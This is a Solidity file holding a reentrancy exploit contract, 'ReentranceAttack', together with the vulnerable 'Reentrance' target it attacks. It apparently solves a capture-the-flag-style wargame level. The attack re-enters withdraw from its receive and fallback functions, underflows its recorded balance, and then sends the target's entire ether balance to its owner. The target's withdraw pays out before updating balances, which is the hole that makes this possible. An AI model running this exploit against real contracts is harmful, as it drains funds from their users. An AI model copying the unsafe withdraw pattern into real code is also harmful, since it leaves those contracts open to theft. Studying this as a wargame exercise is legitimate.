// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.2/contracts/math/SafeMath.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.2/contracts/access/Ownable.sol";

contract ReentranceAttack {

  Reentrance target;
  address payable private _owner;
  uint private _amount;
  uint private _withdrawCalls;

  constructor(address payable _target) public payable {
    target = Reentrance(_target);
    _owner = payable(msg.sender);
    _amount = msg.value;
  }

  function attack_1_causeOverflow() public payable {
    _amount = address(this).balance;
    require(_amount > 0, "Send some ether.");
    _withdrawCalls = 2;
    target.donate{value:_amount}(address(this));
    target.withdraw(_amount);
  }

  function attack_2_deplete() public {
    _withdrawCalls = 2;
    target.withdraw(address(target).balance);
    _owner.transfer(address(this).balance);
  }

  receive() external payable {
    if(_withdrawCalls > 0) {
        target.withdraw(_amount);
        _withdrawCalls = _withdrawCalls - 1;
    }
  }
  
  fallback() external payable {
    if(_withdrawCalls > 0) {
        target.withdraw(_amount);
        _withdrawCalls = _withdrawCalls - 1;
    }
  }
}

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
